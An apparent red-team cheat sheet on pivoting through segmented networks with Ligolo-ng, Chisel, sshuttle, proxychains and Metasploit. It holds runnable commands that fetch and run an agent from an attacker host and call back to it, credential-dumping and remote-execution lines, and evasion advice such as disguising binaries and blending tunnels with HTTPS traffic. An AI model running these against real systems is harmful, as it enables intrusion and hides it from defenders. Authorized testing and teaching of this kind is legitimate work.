# Pivoting: Ligolo-ng, Chisel, sshuttle & proxychains

The modern field guide to moving through segmented networks after you own a foothold. Covers tool selection, **Ligolo-ng** (the current go-to), **Chisel**, **sshuttle**, SOCKS + **proxychains**, single/double/triple pivots, and OPSEC. Authorized engagements only — pivoting crosses network boundaries that are explicitly in (or out of) scope; confirm before you route.

---

## Concepts

- **Foothold / pivot host:** the box you already control that can reach a network you cannot.
- **SOCKS proxy:** a generic TCP (sometimes UDP) proxy; tools route through it via `proxychains` or native SOCKS support.
- **TUN-based pivot (Ligolo-ng):** creates a virtual network interface on your attack box; the kernel routes the target subnet to it, so tools connect **directly** (no proxychains, full nmap SYN scans, native UDP).
- **Port forward:** map a single remote `ip:port` to a local socket. Simple, limited.
- **Single vs double vs triple pivot:** each new network you can only reach *through* the previous foothold is another pivot layer.

```
Attacker ──► Pivot A (dual-homed) ──► Subnet B ──► Pivot B ──► Subnet C ...
            \__ Ligolo agent __/                  \__ second agent __/
```

---

## Tool Selection

| Tool | Mechanism | Speed | Needs root on target | Best for | Notes |
|------|-----------|-------|----------------------|----------|-------|
| **Ligolo-ng** | TUN + userland netstack (gVisor) | Fast | No | Default for almost everything | No proxychains; direct tools; easy multi-pivot |
| **Chisel** | HTTP/WebSocket + SSH-crypto, SOCKS | Medium | No | DPI/HTTP-only egress, fallback | Mature, single static binary |
| **sshuttle** | SSH + iptables/PF (VPN-like) | Fast | Root on *client* | When you have SSH creds to pivot | Transparent routing, no proxy |
| **SSH -D / -R / -L** | SSH tunnels | Medium | No | When SSH access exists | Built-in everywhere; see port-forwarding-guide.md |
| **Metasploit autoroute + socks_proxy** | Meterpreter route + SOCKS | Slow | No | Already in MSF | Convenient, not stealthy |
| **proxychains** | LD_PRELOAD wrapper | n/a | n/a | Driving tools through any SOCKS | Won't wrap static binaries; TCP-connect only |

Rule of thumb: **reach for Ligolo-ng first** (cleanest, fastest, no proxychains pain). Fall back to **Chisel** when only HTTP egress is allowed or you need a tiny dependency-free binary. Use **sshuttle/SSH** when you already hold SSH creds.

---

## Ligolo-ng (Primary)

Two parts: a **proxy** (runs on *your* attack box, owns the TUN interface) and an **agent** (runs on the compromised pivot, no privileges needed). The proxy presents the agent's reachable subnets as routes on your machine.

### One-time TUN setup (attacker)

```bash
# Create a dedicated TUN interface for ligolo
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Start the proxy (attacker)

```bash
# Self-signed TLS (lab/quick) — agents connect with -ignore-cert
./proxy -selfcert
# or specify the listen port:
./proxy -selfcert -laddr 0.0.0.0:11601
# Production: use a real cert / let's-encrypt to avoid -ignore-cert
```

### Deploy & run the agent (on the pivot host)

```bash
# Transfer the matching agent binary (Linux/Windows/macOS, right arch)
wget http://10.10.14.7:8000/agent -O /tmp/agent && chmod +x /tmp/agent

# Connect back to the proxy
/tmp/agent -connect 10.10.14.7:11601 -ignore-cert

# Windows:
.\agent.exe -connect 10.10.14.7:11601 -ignore-cert
```

### Activate the tunnel (in the proxy console)

```bash
session                      # list agents; select the one you want
# Inside the selected session context:
ifconfig                     # see the subnets the agent can reach
start                        # start the tunnel for this session
```

### Route the target subnet to the TUN (attacker, separate terminal)

```bash
# Suppose the agent can reach 10.5.5.0/24:
sudo ip route add 10.5.5.0/24 dev ligolo
ip route | grep ligolo       # verify
```

Now connect with **any** tool, directly — no proxychains:

```bash
nmap -sV -Pn 10.5.5.0/24             # real SYN/Connect scans through the TUN
crackmapexec smb 10.5.5.0/24
xfreerdp /v:10.5.5.20 /u:admin
impacket-secretsdump corp/u:p@10.5.5.10
```

### Expose an attacker service to the internal net (listeners / relays)

Useful for landing reverse shells *from* internal hosts back to your box, or hosting payloads inside the segment:

```bash
# In the proxy session context — forward a port the agent opens to a local port:
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
#   internal host connects to PIVOT:1234  ->  arrives at YOUR 127.0.0.1:4444
listener_list
```

### Double / triple pivot

After you compromise a host *inside* 10.5.5.0/24 and find it reaches 10.6.6.0/24:

```bash
# 1) On the new inner host, run a SECOND ligolo agent. It can't reach your proxy
#    directly, so relay through the first agent using a listener on pivot A:
#    (in proxy, while on session A)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# 2) Inner agent connects to PIVOT_A:11601 (which relays to your proxy):
./agent -connect 10.5.5.20:11601 -ignore-cert

# 3) New session appears in the proxy. Select it, `start`, then route the deeper net:
sudo ip route add 10.6.6.0/24 dev ligolo
```

Repeat for each additional layer. Each agent only sees its local subnets; the listener-relay chain stitches them back to one TUN on your box.

### Ligolo cleanup

```bash
sudo ip route del 10.5.5.0/24 dev ligolo
sudo ip link del ligolo
# kill the agent process on the pivot; remove the dropped binary
```

---

## Chisel (HTTP/WebSocket Fallback)

Single Go binary; tunnels over HTTP(S) with SSH-grade crypto. Best when egress is HTTP-only or Ligolo's TUN is impractical. See also `06-tunneling-and-pivoting/deep-packet-inspection/dpi-bypass.md`.

### Reverse SOCKS (most common: agent inside calls out)

```bash
# Attacker (server):
chisel server -p 8080 --reverse                  # add --tls-key/--tls-cert for HTTPS
# Pivot (client) -> opens SOCKS5 on attacker:1080
./chisel client 10.10.14.7:8080 R:socks
# Verify:
ss -ntlp | grep 1080
# Drive tools:
proxychains nmap -sT -Pn 10.5.5.0/24
```

### Specific reverse port forward (no SOCKS)

```bash
# Pivot forwards internal RDP back to attacker:3389
./chisel client 10.10.14.7:8080 R:3389:10.5.5.20:3389
xfreerdp /v:127.0.0.1:3389 /u:admin
```

### Forward SOCKS (you connect to the pivot)

```bash
# Pivot runs a server; attacker connects and opens local SOCKS:1080
./chisel server -p 8080 --socks5             # on pivot
./chisel client <pivot>:8080 socks           # on attacker -> 127.0.0.1:1080
```

### Authentication & TLS

```bash
chisel server -p 8080 --reverse --auth user:pass
./chisel client --auth user:pass 10.10.14.7:8080 R:socks
# Pin server fingerprint to prevent MITM:
chisel server -p 8080 --reverse --keygen /tmp/key; chisel server -p 8080 --reverse --key "$(cat /tmp/key)"
```

---

## sshuttle (VPN-like via SSH)

When you have SSH creds to the pivot, sshuttle transparently routes whole subnets — no proxychains, supports DNS.

```bash
sshuttle -r user@pivot 10.5.5.0/24 172.16.0.0/16
sshuttle -r user@pivot:2222 10.5.5.0/24 --dns        # custom port + tunnel DNS
sshuttle -r user@pivot 0.0.0.0/0 -x <your_subnet>    # route everything except yourself
# Now tools work natively:
nmap -sT 10.5.5.0/24
```

Requires root on the **client** (your box) and Python on the pivot. Less flexible than Ligolo for multi-hop.

---

## proxychains (Driving Tools Through SOCKS)

```bash
# /etc/proxychains4.conf — set the proxy and tuning
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
# Speed: in proxychains4.conf
strict_chain                 # or dynamic_chain for multi-proxy fallthrough
proxy_dns                    # resolve through the tunnel (avoid DNS leaks)
tcp_read_time_out 8000
tcp_connect_time_out 4000
```
```bash
# Use it:
proxychains -q nmap -sT -Pn -n -p 445,3389,5985 10.5.5.0/24
proxychains -q impacket-psexec corp/u:p@10.5.5.10
proxychains -q evil-winrm -i 10.5.5.10 -u admin -p pass
```

**Hard limits to remember:**
- Only **TCP connect** scans work (`-sT`); no SYN/UDP/ICMP through proxychains. (Ligolo's TUN removes this limit.)
- `LD_PRELOAD` won't hook **statically linked** binaries (e.g., some Go tools) — run those through a TUN pivot instead.
- Chained proxies are slow; keep scans narrow (`--top-ports`, specific ports).

---

## Metasploit Pivot (Quick Reference)

```bash
# In a Meterpreter session:
run post/multi/manage/autoroute SUBNET=10.5.5.0 NETMASK=255.255.255.0
# Background, then open a SOCKS proxy:
background
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1; set SRVPORT 1080; set VERSION 5
run -j
# proxychains -> 127.0.0.1:1080. Or single forward:
sessions -i 1
portfwd add -l 3389 -p 3389 -r 10.5.5.20
```

---

## Pivoting Methodology

```
1. Map the foothold: ip a / ipconfig /all, ip route, arp -a, /etc/hosts
   -> what subnets does this host touch that you can't?
2. Confirm egress: can the pivot reach YOU? (HTTP? raw TCP? only :443?)
   -> picks Ligolo (any TCP) vs Chisel (HTTP) vs SSH.
3. Stand up the pivot (Ligolo agent / chisel client / sshuttle).
4. Add the route / SOCKS; verify with one host (ping won't traverse gVisor —
   use a TCP connect: nc -vz <host> 445).
5. Enumerate the new subnet (nmap, CME) and repeat from step 1 for the next host.
6. Document every route/listener you create for cleanup + the report.
```

---

## OPSEC

- **Egress port matters:** Ligolo/Chisel to `:443` blend with HTTPS; odd high ports stand out in NetFlow.
- **TLS the tunnel:** use real/self-signed certs (Ligolo `-selfcert` or proper PKI; Chisel `--tls-*`) so payloads aren't in plaintext.
- **Volume & beaconing:** continuous high-throughput tunnels (big nmap sweeps) are visible to NDR. Throttle scans; prefer targeted enumeration.
- **Binary on disk:** the agent/chisel binary is an IOC. Name it innocuously, run from memory where possible, and delete it on cleanup.
- **Don't leave listeners open:** `listener_add`/bind ports are hijackable and noisy. Tear them down.
- **ICMP doesn't traverse Ligolo's userland stack** — don't expect ping; this is also a tell if you forget and try.

---

## Cheatsheet

```bash
# --- Ligolo-ng ---
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                   # attacker
./agent -connect 10.10.14.7:11601 -ignore-cert      # pivot
#   proxy console:  session  ->  start
sudo ip route add 10.5.5.0/24 dev ligolo            # attacker
nmap -sV -Pn 10.5.5.0/24                             # direct, no proxychains
#   reverse listener for internal->you:
#   listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp

# --- Chisel reverse SOCKS ---
chisel server -p 8080 --reverse                     # attacker
./chisel client 10.10.14.7:8080 R:socks             # pivot -> attacker:1080
proxychains -q nmap -sT -Pn 10.5.5.0/24

# --- sshuttle ---
sshuttle -r user@pivot 10.5.5.0/24 --dns

# --- proxychains essentials (/etc/proxychains4.conf) ---
# socks5 127.0.0.1 1080  ;  proxy_dns  ;  tcp_connect_time_out 4000
proxychains -q evil-winrm -i 10.5.5.10 -u admin -p pass

# --- MSF ---
run post/multi/manage/autoroute SUBNET=10.5.5.0
use auxiliary/server/socks_proxy; set VERSION 5; run -j
```

---

## References

- Ligolo-ng: https://github.com/nicocha30/ligolo-ng (wiki: https://github.com/nicocha30/ligolo-ng/wiki)
- StationX — Ligolo-ng pivoting guide: https://www.stationx.net/how-to-use-ligolo-ng/
- HackingArticles — Detailed guide on Ligolo-ng: https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
- Chisel: https://github.com/jpillora/chisel
- sshuttle: https://github.com/sshuttle/sshuttle
- proxychains-ng: https://github.com/rofl0r/proxychains-ng
- HackTricks — Tunneling & Port Forwarding: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
- MITRE ATT&CK — Proxy / Internal Proxy (T1090): https://attack.mitre.org/techniques/T1090/
